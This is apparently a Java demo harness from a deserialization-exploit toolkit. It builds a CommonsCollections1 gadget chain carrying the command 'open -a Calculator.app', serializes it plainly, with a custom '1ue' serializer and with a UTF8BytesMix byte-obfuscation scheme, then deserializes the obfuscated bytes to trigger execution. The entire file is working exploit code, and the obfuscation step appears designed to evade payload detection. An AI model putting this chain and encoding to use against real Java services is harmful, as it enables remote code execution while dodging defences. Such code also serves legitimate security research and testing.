package com.ppp;

import com.ppp.utils.Deserializer;
import com.ppp.utils.Serializer;

import java.io.ByteArrayOutputStream;

/**
 * @author Whoopsunix
 */
public class Run {
    public static void main(String[] args) throws Exception {
        /**
         * 原始
         */
        Object gadget = new CommonsCollections1().getObject("open -a Calculator.app");
        byte[] originalBytes = Serializer.serialize(gadget);
        System.out.println("---original---");
        print(originalBytes);

        /**
         * 1ue demo
         */
        byte[] UEBytes = Serializer.serializeCustom(gadget);
        System.out.println("\n\n\n---1ue---");
        print(UEBytes);



        System.out.println("\n\n\n---mix---");
        byte[] mixBytes = new UTF8BytesMix(Serializer.serialize(gadget)).builder();
        print(mixBytes);
        Deserializer.deserialize(mixBytes);
    }


    public static void print(byte[] bytes ){
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        for (byte b : bytes) {
            out.write(b);
        }
        System.out.println(out);
    }
}
